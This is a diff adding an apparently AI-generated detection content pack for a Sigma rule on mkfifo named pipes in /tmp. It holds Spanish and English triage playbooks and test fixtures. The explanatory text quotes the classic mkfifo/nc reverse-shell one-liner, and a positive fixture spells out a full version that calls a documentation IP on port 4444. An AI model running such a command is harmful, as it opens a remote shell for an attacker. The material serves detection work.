@@ -1,0 +1,127 @@
+{
+  "rule": {
+    "id": "999c3b12-0a8c-40b6-8e13-dd7d62b75c7a",
+    "title": "Potentially Suspicious Named Pipe Created Via Mkfifo",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso ejecutó la utilidad mkfifo para crear una named pipe en /tmp. Los atacantes suelen usar FIFOs en /tmp para conectar una shell con una herramienta de red y obtener una reverse shell.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en /mkfifo y CommandLine contiene ' /tmp/', es decir, se crea una named pipe en el directorio /tmp, que tiene permisos de escritura para todos.",
+      "why_it_matters": "Una FIFO en /tmp es la base de la clásica reverse shell 'mkfifo /tmp/f; cat /tmp/f | sh | nc host puerto > /tmp/f'. Le da al atacante ejecución interactiva de comandos (ATT&CK Execution, shell Unix) y le permite retransmitir tráfico.",
+      "triage_steps": [
+        "Revise la CommandLine completa y anote la ruta de la pipe, por ejemplo /tmp/f o /tmp/backpipe.",
+        "Verifique ParentImage y la línea de comandos del padre. Es muy sospechoso que un servidor web, una base de datos o una cuenta de servicio lance sh y luego mkfifo.",
+        "En el mismo host, en un rango de +/- 15 minutos, busque procesos nc, ncat, socat, telnet, openssl s_client, bash -i o sh -i que usen la misma ruta de pipe.",
+        "Revise las conexiones de red del árbol de procesos y busque salidas hacia IPs o puertos externos inusuales.",
+        "Identifique el usuario. Confirme si esa cuenta suele usar shells interactivas y si la sesión era esperada.",
+        "Busque alertas previas del mismo host y usuario, como actividad de web shell, explotación o descargas a /tmp.",
+        "Compruebe si la pipe sigue en disco (ls -l /tmp) y qué procesos la tienen abierta (lsof)."
+      ],
+      "false_positives": [
+        "Scripts de administradores o desarrolladores que usan FIFOs en /tmp para comunicación entre procesos, logging o pruebas.",
+        "Sistemas de build, jobs de CI o herramientas de respaldo que crean pipes temporales en /tmp.",
+        "Pruebas de penetración o ejercicios de red team autorizados."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del sistema si la actividad es esperada. Si es legítima, documéntela y ajuste la regla por proceso padre o usuario.",
+        "Si confirma una reverse shell, aísle el host o bloquee la IP remota. Termine los procesos de shell y de red después de preservar la evidencia.",
+        "Recolecte evidencia volátil: árbol de procesos, sockets abiertos, la FIFO, el historial de shell y el contenido de /tmp.",
+        "Identifique y corrija el vector de acceso inicial, por ejemplo una aplicación web vulnerable o credenciales robadas, y busque mecanismos de persistencia.",
+        "Rote las credenciales usadas en el host y mantenga el monitoreo ante posibles reingresos."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque una FIFO en /tmp es un indicador fuerte de reverse shell, pero los scripts legítimos también la usan, así que se necesita contexto para confirmarlo."
+    },
+    "en": {
+      "summary": "A process ran the mkfifo utility to create a named pipe under /tmp. Attackers often use FIFOs in /tmp to wire a shell to a network tool for a reverse shell.",
+      "what_it_detects": "Process creation events where Image ends with /mkfifo and CommandLine contains ' /tmp/', meaning a named pipe is being created in the world-writable /tmp directory.",
+      "why_it_matters": "A FIFO in /tmp is the core of the classic 'mkfifo /tmp/f; cat /tmp/f | sh | nc host port > /tmp/f' reverse shell. It gives an attacker interactive command execution (ATT&CK Execution, Unix shell) and can relay traffic.",
+      "triage_steps": [
+        "Read the full CommandLine and note the pipe path, for example /tmp/f or /tmp/backpipe.",
+        "Check ParentImage and the parent command line. A web server, database, or service account spawning sh then mkfifo is highly suspicious.",
+        "On the same host within +/- 15 minutes, look for nc, ncat, socat, telnet, openssl s_client, bash -i or sh -i processes that reference the same pipe path.",
+        "Review network connections from that process tree for outbound connections to unusual external IPs or ports.",
+        "Identify the user. Check whether this account usually runs interactive shells, and whether the login session was expected.",
+        "Search for earlier alerts on this host and user, such as web shell activity, exploitation, or downloads to /tmp.",
+        "Check whether the pipe still exists on disk (ls -l /tmp) and which processes hold it open (lsof)."
+      ],
+      "false_positives": [
+        "Admin or developer scripts that use FIFOs in /tmp for inter-process communication, logging, or test harnesses.",
+        "Build systems, CI jobs, or backup tools that create temporary pipes under /tmp.",
+        "Authorized penetration testing or red team exercises."
+      ],
+      "response_steps": [
+        "Verify with the system owner whether the activity is expected. Document it if it is benign, and tune the rule by parent or user.",
+        "If you confirm a reverse shell, isolate the host or block the remote IP, then kill the shell and network-tool processes once evidence is captured.",
+        "Collect volatile evidence: the process tree, open sockets, the FIFO and shell history, and the contents of /tmp.",
+        "Find and fix the initial access vector, for example a vulnerable web app or stolen credentials, and look for persistence.",
+        "Rotate credentials used on the host and keep monitoring for re-entry."
+      ],
+      "severity_rationale": "Medium fits because FIFOs in /tmp are a strong reverse-shell indicator, but legitimate scripts also create them, so you need context to confirm."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "A web server shell creates the FIFO for a reverse shell: rm /tmp/f; mkfifo /tmp/f",
+        "event": {
+          "Image": "/usr/bin/mkfifo",
+          "CommandLine": "mkfifo /tmp/f",
+          "ParentImage": "/bin/sh",
+          "ParentCommandLine": "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.45 4444 >/tmp/f",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "Computer": "web-01"
+        }
+      },
+      {
+        "description": "An interactive user creates a backpipe in /tmp with explicit permissions",
+        "event": {
+          "Image": "/bin/mkfifo",
+          "CommandLine": "/bin/mkfifo -m 600 /tmp/.backpipe",
+          "ParentImage": "/bin/bash",
+          "User": "jperez",
+          "ProcessId": 9132,
+          "Computer": "bastion-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "mkfifo creates a pipe under /var/tmp. The CommandLine does not contain ' /tmp/' because the path starts with /var",
+        "event": {
+          "Image": "/usr/bin/mkfifo",
+          "CommandLine": "mkfifo -m 600 /var/tmp/app-logger.fifo",
+          "ParentImage": "/usr/bin/bash",
+          "User": "svc-app",
+          "ProcessId": 2211,
+          "Computer": "app-02"
+        }
+      },
+      {
+        "description": "A service creates a FIFO under /run, which is outside /tmp",
+        "event": {
+          "Image": "/usr/bin/mkfifo",
+          "CommandLine": "mkfifo /run/backup/stream.pipe",
+          "ParentImage": "/usr/lib/systemd/systemd",
+          "User": "root",
+          "ProcessId": 1544,
+          "Computer": "backup-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:11+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
